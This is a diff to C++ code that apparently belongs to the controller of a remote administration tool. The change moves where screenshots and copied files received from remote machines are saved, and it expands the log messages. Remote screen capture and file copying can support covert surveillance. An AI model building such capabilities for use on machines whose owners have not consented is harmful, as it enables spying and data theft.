@@ -246,18 +246,18 @@ void MyCurl::AdminProcess(const vector<string> IDs, const int query) {
 					}
 					if (query == 22) { //More query, Capture screenshot
 						subContent = base64_decode(subContent);
-						fstream file("_Data/screenshot" + receiverID + ".jpg", ios::out | ios::binary);
+						fstream file(ComPath + "Screenshot/screenshot" + receiverID + ".jpg", ios::out | ios::binary);
 						file << subContent;
 						file.close();
-						cout << "Saved screenshot of " + receiverID << endl;
+						cout << "Saved screenshot of " + receiverID + " at " + ComPath + "Screenshot/screenshot" + receiverID << endl;
 					}
 					else if (query == 20) { //result is fileName, Copy file
 						subContent = base64_decode(subContent);
 						string fileName = GetFileName();
-						fstream file("_Data/Copy/" + fileName + receiverID, ios::out | ios::binary);
+						fstream file(ComPath + "Copy/" + fileName + receiverID, ios::out | ios::binary);
 						file << subContent;
 						file.close();
-						cout << "Saved copy file of at " << "_Data/Copy/" + fileName + receiverID << endl;
+						cout << "Saved copy file of " + receiverID + " at " + ComPath + "Copy/" + fileName + receiverID << endl;
 					}
 					IDSet.erase(receiverID);
 				}
